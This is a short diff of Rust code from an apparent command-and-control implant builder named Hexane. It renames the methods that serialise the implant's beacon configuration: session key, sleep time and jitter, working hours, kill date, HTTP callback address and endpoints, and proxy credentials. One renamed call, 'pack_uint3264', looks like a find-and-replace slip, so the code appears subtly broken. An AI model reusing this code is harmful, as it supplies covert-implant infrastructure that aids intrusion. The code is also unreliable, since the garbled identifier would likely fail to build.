@@ -99,13 +99,13 @@ impl Hexane {
             .unwrap();
 
         stream.pack_bytes(&self.session_key);
-        stream.pack_dword(self.peer_id);
+        stream.pack_uint32(self.peer_id);
         stream.pack_string(&self.main_cfg.hostname);
-        stream.pack_dword(self.main_cfg.sleeptime);
-        stream.pack_dword(self.main_cfg.jitter as u32);
+        stream.pack_uint32(self.main_cfg.sleeptime);
+        stream.pack_uint32(self.main_cfg.jitter as u32);
 
         stream.pack_int32(working_hours);
-        stream.pack_dword64(kill_date);
+        stream.pack_uint3264(kill_date);
 
         if let Some(network) = self.network_cfg.as_mut() {
             let rtype   = &network.r#type;
@@ -117,8 +117,8 @@ impl Hexane {
 
                     stream.pack_wstring(useragent);
                     stream.pack_wstring(&http.address);
-                    stream.pack_dword(http.port as u32);
-                    stream.pack_dword(http.endpoints.len() as u32);
+                    stream.pack_uint32(http.port as u32);
+                    stream.pack_uint32(http.endpoints.len() as u32);
 
                     for endpoint in &http.endpoints {
                         stream.pack_wstring(endpoint);
@@ -127,18 +127,18 @@ impl Hexane {
                     if let Some(ref domain) = http.domain {
                         stream.pack_string(domain);
                     } else {
-                        stream.pack_dword(0);
+                        stream.pack_uint32(0);
                     }
 
                     if let Some(ref proxy) = http.proxy {
                         let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
 
-                        stream.pack_dword(1);
+                        stream.pack_uint32(1);
                         stream.pack_wstring(&proxy_url);
                         stream.pack_wstring(proxy.username.as_ref().unwrap());
                         stream.pack_wstring(proxy.password.as_ref().unwrap());
                     } else {
-                        stream.pack_dword(0);
+                        stream.pack_uint32(0);
                     }
                 }
 
